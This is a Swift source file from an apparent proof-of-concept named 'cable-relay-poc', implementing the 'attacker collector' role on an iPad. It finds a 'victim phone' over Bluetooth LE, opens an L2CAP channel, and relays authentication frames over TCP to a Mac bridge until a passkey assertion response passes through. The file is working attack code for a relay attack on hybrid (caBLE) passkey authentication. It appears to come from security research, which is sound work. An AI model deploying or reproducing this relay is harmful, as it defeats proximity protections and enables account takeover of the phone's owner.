//
//  CollectorCentral.swift
//  cable-relay-poc — ATTACKER COLLECTOR role (runs on the iPad)
//

import Foundation
import CoreBluetooth
import Network

final class CollectorCentral: NSObject, ObservableObject {

    @Published var log: [String] = []
    @Published var relaying = false
    @Published var framesRelayed = 0
    @Published var ceremonyState: CeremonyState = .idle

    enum CeremonyState: Equatable {
        case idle
        case scanning
        case bleConnected
        case l2capOpen
        case relayActive
        case ceremonyComplete
        case failed(String)
    }

    var bridgeHost: String = "192.168.1.50"
    var bridgePort: UInt16 = 7070

    private var manager: CBCentralManager!
    private var phone: CBPeripheral?
    private var psmChar: CBCharacteristic?
    private var channel: CBL2CAPChannel?
    private var l2capIn = Data()
    private var l2capReady = false
    private var pendingToPhone: [Data] = []

    private var tcp: NWConnection?
    private var tcpIn = Data()
    private var tcpReady = false

    func start() {
        manager = CBCentralManager(delegate: self, queue: .main)
        connectBridge()
    }

    func retest() {
        line("--- RETEST: resetting for new ceremony ---")
        channel?.inputStream.close()
        channel?.outputStream.close()
        channel = nil
        l2capReady = false
        l2capIn = Data()
        pendingToPhone = []
        framesRelayed = 0

        tcp?.cancel()
        tcp = nil
        tcpIn = Data()
        tcpReady = false

        if let p = phone {
            manager.cancelPeripheralConnection(p)
        }
        phone = nil
        psmChar = nil
        relaying = false
        ceremonyState = .idle

        connectBridge()
        if manager.state == .poweredOn {
            manager.scanForPeripherals(withServices: [CBUUID(string: BLEIDs.serviceUUID)])
            ceremonyState = .scanning
            line("re-scanning for victim phone")
        }
    }

    private func line(_ s: String) {
        NSLog("[IPAD-RELAY] %@", s)
        AxiomLog.shared?.log(s)
        DispatchQueue.main.async { self.log.append(s) }
    }

    // MARK: TCP bridge to the Mac
    private func connectBridge() {
        let conn = NWConnection(
            host: NWEndpoint.Host(bridgeHost),
            port: NWEndpoint.Port(rawValue: bridgePort)!,
            using: .tcp)
        conn.stateUpdateHandler = { [weak self] st in
            guard let self else { return }
            switch st {
            case .ready:
                self.tcpReady = true
                self.line("TCP bridge to Mac ready")
                self.pumpTCP()
            case .failed(let e): self.line("TCP failed \(e)")
            case .waiting(let e): self.line("TCP waiting \(e)")
            default: break
            }
        }
        tcp = conn
        conn.start(queue: .main)
    }

    private func pumpTCP() {
        tcp?.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, done, err in
            guard let self else { return }
            if let d = data, !d.isEmpty {
                self.tcpIn.append(d)
                for frame in Frame.drain(&self.tcpIn) {
                    self.toPhone(frame)
                }
            }
            if let err { self.line("TCP recv error: \(err)"); return }
            if done { self.line("TCP done (EOF)"); return }
            self.pumpTCP()
        }
    }

    private func toMac(_ frame: Data) {
        guard tcpReady else { line("toMac: TCP not ready, dropping"); return }
        tcp?.send(content: Frame.encode(frame), completion: .contentProcessed { [weak self] err in
            if let err { self?.line("TCP send error: \(err)") }
        })
        DispatchQueue.main.async { self.framesRelayed += 1 }
        checkCeremonyProgress(frame)
    }

    private func toPhone(_ frame: Data) {
        guard l2capReady, let out = channel?.outputStream else {
            line("toPhone: L2CAP not ready, buffering frame (\(frame.count) bytes)")
            pendingToPhone.append(frame)
            return
        }
        let wire = Frame.encode(frame)
        let n = wire.withUnsafeBytes { out.write($0.bindMemory(to: UInt8.self).baseAddress!,
                                                  maxLength: wire.count) }
        if n < 0 {
            line("toPhone: write error \(out.streamError?.localizedDescription ?? "unknown")")
        }
        DispatchQueue.main.async { self.framesRelayed += 1 }
        checkCeremonyProgress(frame)
    }

    private func checkCeremonyProgress(_ frame: Data) {
        guard let msg = Message.decode(frame) else { return }
        if msg.type == .assertionResponse {
            DispatchQueue.main.async {
                self.ceremonyState = .ceremonyComplete
                self.line("RELAY CEREMONY COMPLETE — all frames forwarded")
            }
        }
    }

    private func flushPendingToPhone() {
        guard !pendingToPhone.isEmpty else { return }
        line("flushing \(pendingToPhone.count) buffered frame(s) to phone")
        let frames = pendingToPhone
        pendingToPhone.removeAll()
        for frame in frames { toPhone(frame) }
    }
}

// MARK: - Central: find phone, read PSM, open L2CAP
extension CollectorCentral: CBCentralManagerDelegate, CBPeripheralDelegate {

    func centralManagerDidUpdateState(_ c: CBCentralManager) {
        guard c.state == .poweredOn else { line("BLE state \(c.state.rawValue)"); return }
        c.scanForPeripherals(withServices: [CBUUID(string: BLEIDs.serviceUUID)])
        ceremonyState = .scanning
        line("scanning for victim phone")
    }

    func centralManager(_ c: CBCentralManager, didDiscover p: CBPeripheral,
                        advertisementData: [String: Any], rssi RSSI: NSNumber) {
        line("discovered phone RSSI \(RSSI)")
        c.stopScan()
        phone = p
        p.delegate = self
        c.connect(p)
    }

    func centralManager(_ c: CBCentralManager, didConnect p: CBPeripheral) {
        ceremonyState = .bleConnected
        line("connected; discovering service")
        p.discoverServices([CBUUID(string: BLEIDs.serviceUUID)])
    }

    func centralManager(_ c: CBCentralManager, didFailToConnect p: CBPeripheral, error: Error?) {
        line("failed to connect: \(error?.localizedDescription ?? "unknown")")
        ceremonyState = .failed("BLE connect failed")
    }

    func peripheral(_ p: CBPeripheral, didDiscoverServices error: Error?) {
        if let e = error { line("discover services error: \(e.localizedDescription)"); return }
        guard let svc = p.services?.first else { line("no services found"); return }
        line("found service; discovering PSM characteristic")
        p.discoverCharacteristics([CBUUID(string: BLEIDs.psmCharUUID)], for: svc)
    }

    func peripheral(_ p: CBPeripheral, didDiscoverCharacteristicsFor s: CBService, error: Error?) {
        if let e = error { line("discover chars error: \(e.localizedDescription)"); return }
        guard let ch = s.characteristics?.first else { line("no characteristics found"); return }
        psmChar = ch
        line("found PSM characteristic; reading value")
        p.readValue(for: ch)
    }

    func peripheral(_ p: CBPeripheral, didUpdateValueFor ch: CBCharacteristic, error: Error?) {
        if let e = error { line("read PSM error: \(e.localizedDescription)"); return }
        guard let v = ch.value, v.count == 2 else { line("bad PSM value"); return }
        let psm = v.withUnsafeBytes { CBL2CAPPSM($0.load(as: UInt16.self).bigEndian) }
        line("read PSM \(psm); opening L2CAP")
        p.openL2CAPChannel(psm)
    }

    func peripheral(_ p: CBPeripheral, didOpen channel: CBL2CAPChannel?, error: Error?) {
        if let e = error { line("L2CAP open error \(e.localizedDescription)"); return }
        guard let ch = channel else { line("L2CAP channel nil"); return }
        self.channel = ch
        ch.inputStream.delegate = self
        ch.outputStream.delegate = self
        ch.inputStream.schedule(in: .main, forMode: .common)
        ch.outputStream.schedule(in: .main, forMode: .common)
        ch.inputStream.open()
        ch.outputStream.open()
        l2capReady = true
        relaying = true
        ceremonyState = .relayActive
        line("L2CAP open — RELAY ACTIVE (phone<->iPad radio, iPad<->Mac TCP)")
        flushPendingToPhone()
    }
}

// MARK: - Pump L2CAP -> Mac
extension CollectorCentral: StreamDelegate {
    func stream(_ aStream: Stream, handle event: Stream.Event) {
        switch event {
        case .hasBytesAvailable:
            guard let inp = channel?.inputStream else { return }
            var tmp = [UInt8](repeating: 0, count: 4096)
            while inp.hasBytesAvailable {
                let n = inp.read(&tmp, maxLength: tmp.count)
                if n > 0 { l2capIn.append(contentsOf: tmp[0..<n]) } else { break }
            }
            for frame in Frame.drain(&l2capIn) {
                line("L2CAP -> Mac: relaying \(frame.count) bytes")
                toMac(frame)
            }
        case .hasSpaceAvailable:
            break
        case .errorOccurred:
            line("L2CAP stream error: \(aStream.streamError?.localizedDescription ?? "unknown")")
        case .endEncountered:
            line("L2CAP stream ended")
            l2capReady = false
        default: break
        }
    }
}
